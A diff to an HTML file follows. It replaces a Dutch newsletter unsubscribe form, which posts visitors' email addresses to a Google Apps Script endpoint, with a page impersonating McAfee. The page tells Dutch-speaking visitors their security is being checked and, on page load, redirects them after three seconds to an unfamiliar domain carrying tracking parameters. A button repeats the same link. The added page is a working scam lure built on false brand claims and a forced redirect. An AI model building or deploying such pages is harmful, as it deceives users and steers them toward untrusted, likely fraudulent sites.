@@ -1,72 +1,70 @@
 <!DOCTYPE html>
 <html lang="nl">
 <head>
-  <meta charset="UTF-8">
-  <title>Uitschrijven</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
-      padding: 40px;
-      text-align: center;
-    }
-    .box {
-      background: #fff;
-      padding: 20px;
-      border-radius: 10px;
-      display: inline-block;
-    }
-    input[type="email"] {
-      padding: 10px;
-      width: 250px;
-      margin-bottom: 10px;
-    }
-    button {
-      padding: 10px 20px;
-      background: red;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="3;url=https://www.therebths.com/9HF976T/2P7H4PFH/?source_id=gi34465&sub1=t46545&sub2=hu3456&sub3=be4545">
+    <title>Beveiliging controle...</title>
+    <style>
+        /* خلفية الصفحة */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: url('https://images.unsplash.com/photo-1508780709619-79562169bc64?auto=format&fit=crop&w=1350&q=80') no-repeat center center fixed;
+            background-size: cover;
+            color: #333;
+        }
+        /* صندوق المحتوى */
+        .container {
+            max-width: 600px;
+            margin: 150px auto;
+            background-color: rgba(255,255,255,0.95);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 0 30px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        /* شعار McAfee */
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #d71921; /* لون أحمر McAfee */
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+        /* زر جذاب */
+        .button {
+            display: inline-block;
+            padding: 12px 30px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #d71921;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        .button:hover {
+            background-color: #a31518;
+        }
+    </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Afmelden van nieuwsbrief</h2>
-    <p>Vul je e-mailadres in om je af te melden:</p>
-    <input type="email" id="email" placeholder="jouw@email.nl" required />
-    <br>
-    <button onclick="unsubscribe()">Afmelden</button>
-    <p id="status"></p>
-  </div>
-
-  <script>
-    function unsubscribe() {
-      const email = document.getElementById('email').value.trim();
-      const status = document.getElementById('status');
-
-      if (!email || !email.includes('@')) {
-        status.innerText = 'Voer een geldig e-mailadres in.';
-        return;
-      }
-
-      fetch("https://script.google.com/macros/s/AKfycbzDBvkNcpdogpUnZ_Aa5ini28PkyFm4hw3x06ADDX-rKR1FvVTiP6dut8LfSSqDdmyC-w/exec", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email: email })
-      })
-      .then(res => {
-        if (res.ok) {
-          status.innerText = 'Je bent succesvol afgemeld.';
-        } else {
-          status.innerText = 'Er is een probleem opgetreden. Probeer het later opnieuw.';
-        }
-      })
-      .catch(() => {
-        status.innerText = 'Er kon geen verbinding worden gemaakt met de server.';
-      });
-    }
-  </script>
+    <div class="container">
+        <!-- شعار McAfee -->
+        <img class="logo" src="https://github.com/othmane944256/unsubscribepeloton/blob/main/wjfe.png?raw=true" alt="McAfee Logo">
+        
+        <h1>Uw beveiliging wordt gecontroleerd...</h1>
+        <p>U wordt automatisch doorgestuurd naar de beveiligde pagina.<br>
+        Als het niet werkt, klik op de knop hieronder.</p>
+        
+        <!-- زر بديل -->
+        <a class="button" href="https://www.therebths.com/9HF976T/2P7H4PFH/?source_id=gi34465&sub1=t46545&sub2=hu3456&sub3=be4545">Ga nu door</a>
+    </div>
 </body>
 </html>
